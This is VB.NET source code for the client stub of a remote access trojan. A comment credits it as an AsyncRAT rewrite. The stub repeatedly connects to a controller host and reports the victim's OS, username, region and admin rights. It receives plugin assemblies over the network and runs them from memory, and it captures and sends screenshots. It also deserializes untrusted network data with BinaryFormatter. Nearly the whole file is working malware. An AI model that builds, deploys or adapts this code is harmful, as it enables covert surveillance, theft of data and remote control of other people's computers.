Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Globalization
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Security.Principal
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Runtime.InteropServices
Imports PacketLib.Packet
Imports System.Drawing.Imaging
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Drawing.Drawing2D

Public Class C

    Private Shared T As TcpClient = New TcpClient()

    Public Shared H As String = "127.0.0.1"
    Public Shared P As String = "5900"

    Public Shared Sub Check()

        Dim b As Byte() = System.Text.Encoding.UTF8.GetBytes("")
        While True

            Thread.Sleep(1000)

            Try

                T.GetStream.Write(b, 0, b.Length)

            Catch ex As Exception

                Try
                    T = New TcpClient

                    T.Connect(IPAddress.Parse(H), Integer.Parse(P))

                    If T.Connected = True Then
                        Dim N As NetworkStream = T.GetStream()
                        Dim O As New Threading.Thread(Sub() R(N))
                        O.Start()
                    End If

                Catch esqx As Exception

                End Try


            End Try

        End While
    End Sub

    Public Shared Sub Main()

        SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED Or EXECUTION_STATE.ES_SYSTEM_REQUIRED Or EXECUTION_STATE.ES_AWAYMODE_REQUIRED)
        Try
            T.Connect(IPAddress.Parse(H), Integer.Parse(P))

            If T.Connected = True Then
                Dim N As NetworkStream = T.GetStream()
                Dim O As New Threading.Thread(Sub() R(N))
                O.Start()
            End If

        Catch ex As Exception


            While T.Connected = False


                Try
                    T.Connect(IPAddress.Parse(H), Integer.Parse(P))

                    If T.Connected = True Then
                        Dim N As NetworkStream = T.GetStream()
                        Dim O As New Threading.Thread(Sub() R(N))
                        O.Start()
                    End If

                Catch exs As Exception

                End Try
            End While

        End Try

        Dim Checker_ As New Thread(Sub() Check())

        Checker_.Start()
    End Sub
    Public Shared Async Sub R(ByVal L As NetworkStream)


        While True

            Dim sf As BinaryFormatter = New BinaryFormatter()
            Dim packet As PacketMaker = CType(sf.Deserialize(L), PacketMaker)

            Select Case packet.Type_Packet

                Case PacketType.ID

                    Dim I As New Microsoft.VisualBasic.Devices.Computer

                    Dim D As New List(Of String) From {
                            I.Info.OSFullName,
                            Environment.UserName,
                            I.Info.OSVersion,
                            RegionInfo.CurrentRegion.Name & " - " & RegionInfo.CurrentRegion.EnglishName,
                            Process.GetCurrentProcess.Handle,
                            Privilege()
                        }


                    Dim P As New PacketMaker With {
                            .Type_Packet = PacketType.ID,
                            .Misc = D.ToArray
                        }

                    sf.Serialize(L, P)


                Case PacketType.PLUGIN
                    ' SyncLock T.GetStream
                    '   Dim S As New Thread(Sub() Launch(T, packet.Plugin, packet.Function_Params))
                    '  S.Start()
                    Await Task.Run(Sub() Launch(T, packet.Plugin, packet.Function_Params))
                  '  End SyncLock
                    '  Launch(T, packet.Plugin, packet.Function_Params)
                   ' Launch(T, packet.Plugin, packet.Function_Params)
               '     Threading.ThreadPool.QueueUserWorkItem(Sub() )
                        Case PacketType.MSG

                    NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)

                Case PacketType.RD


                    Dim O As Object() = packet.Function_Params
                    '
                    '    Threading.ThreadPool.QueueUserWorkItem(Sub())
                    '  Capture(O(0), O(1), O(2), O(3))

                    Await Task.Run(Sub() Capture(O(0), O(1), O(2), O(3)))
            End Select

        End While

    End Sub

    '  Public Shared Async Sub Launch(ByVal k As TcpClient, ByVal B As Byte(), ByVal P As Object())



    <DllImport("kernel32.dll", SetLastError:=True)>
    Public Shared Function SetThreadExecutionState(ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE

    End Function


    Public Enum EXECUTION_STATE As UInteger

        ES_CONTINUOUS = &H80000000UI

        ES_DISPLAY_REQUIRED = &H2

        ES_SYSTEM_REQUIRED = &H1

        ES_AWAYMODE_REQUIRED = &H40

    End Enum

    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
    <DllImport("psapi")>
    Public Shared Function EmptyWorkingSet(ByVal hfandle As IntPtr) As Boolean

    End Function
    Private Declare Function NtTerminateProcess Lib "ntdll.dll" (hfandle As IntPtr, ErrorStatus As Integer) As UInteger

    Private Shared Function Privilege() As String
        Dim ID = WindowsIdentity.GetCurrent()

        Dim principal = New WindowsPrincipal(ID)

        If principal.IsInRole(WindowsBuiltInRole.Administrator) Then

            Return "Admin"
        Else
            Return "User"
        End If

    End Function




    Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
        Try
            Dim j As Integer
            Dim encoders() As ImageCodecInfo
            encoders = ImageCodecInfo.GetImageEncoders()

            j = 0
            While j < encoders.Length
                If encoders(j).FormatID = format.Guid Then
                    Return encoders(j)
                End If
                j += 1
            End While
            Return Nothing
        Catch ex As Exception
        End Try
    End Function

    Public Shared Async Sub Launch(ByVal k As TcpClient, ByVal B As Byte(), ByVal P As Object())
        'Use synlock to avoid sending packet at same time and make collisions
        'Please do not use Async for this sub otherwise it will work partially lol
        '   SyncLock T

        Dim assemblytoload As System.Reflection.Assembly = System.Reflection.Assembly.Load(B)

        Dim method As System.Reflection.MethodInfo = assemblytoload.[GetType]("PL.Main").GetMethod("Main")

        Dim obj As Object = assemblytoload.CreateInstance(method.Name)

        Await Task.Run(Sub() method.Invoke(obj, New Object() {k, P}))
        '
        '   method.Invoke(obj, New Object() {k, P})

        assemblytoload = Nothing

        method = Nothing
        ' End SyncLock

        GC.Collect()
        GC.WaitForPendingFinalizers()
        SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        EmptyWorkingSet(Process.GetCurrentProcess.Handle)
    End Sub
    ''Comes from AsyncRat VBNET rewritten by Arsium
    Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer, ByVal Q As Integer, ByVal F As String)
        '    SyncLock T

        '       Await Task.Run(Sub()


        Try
                               '  Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize

                               Dim iamage As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)

                               Dim graphics As Graphics = Graphics.FromImage(iamage)

                               graphics.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed


                               graphics.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)

                               Dim P As New Point

                               GetCursorPos(P)

                               Dim CS As New CURSORINFOHELPER

                               CS.cbSize = Marshal.SizeOf(CS)

                               GetCursorInfo(CS)

                               If CS.flags = &H1 Then ''SO IMPORTANT TO CHECK IF CURSOR IS NOT HIDDEN ! Else will crash without error message
                                   '
                                   graphics.DrawIcon(Icon.FromHandle(CS.hCursor), P.X, P.Y)

                               End If

                               Dim Resize As New Bitmap(W, H)
                               Dim g2 As Graphics = Graphics.FromImage(Resize)
                               g2.CompositingQuality = CompositingQuality.HighSpeed
                               g2.DrawImage(iamage, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)

                               Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, Q)
                               Dim encoderInfo As ImageCodecInfo

                               If F = "PNG" Then

                                   encoderInfo = GetEncoderInfo(ImageFormat.Png)

                               ElseIf F = "JPEG" Then

                                   encoderInfo = GetEncoderInfo(ImageFormat.Jpeg)

                               ElseIf F = "GIF" Then

                                   encoderInfo = GetEncoderInfo(ImageFormat.Gif)

                               End If



                               Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
                               encoderParameters.Param(0) = encoderParameter

                               Dim MS As New IO.MemoryStream
                               Resize.Save(MS, encoderInfo, encoderParameters)

                               Try
                SyncLock T

                    Dim packet As New PacketMaker With {
                   .Misc = New Object() {MS.ToArray},
               .Type_Packet = PacketType.RD
                   }

                    Dim Send As New Packet_Send With {
                .Packet = packet
                }
                    Send.Send(T.GetStream)

                End SyncLock
            Catch ex As Exception

                               End Try

                               Try
                                   graphics.Dispose()
                                   g2.Dispose()
                                   iamage.Dispose()
                                   Resize.Dispose()
                                   MS.Dispose()
                                   encoderParameter.Dispose()
                                   encoderParameters.Dispose()
                               Catch ex As Exception
                               End Try

                           Catch ex As Exception
                           End Try
        ' End SyncLock
        '       End Sub)
    End Sub





    <DllImport("user32.dll")>
    Public Shared Function GetCursorInfo(ByRef pci As CURSORINFOHELPER) As Boolean

    End Function

    <DllImport("user32.dll")>
    Public Shared Function GetCursorPos(<Out> ByRef lpPoint As Point) As Boolean

    End Function

    <StructLayout(LayoutKind.Sequential)>
    Structure CURSORINFOHELPER

        Public cbSize As Int32

        Public flags As Int32

        Public hCursor As IntPtr

        Public ptScreenPos As Point

    End Structure
End Class
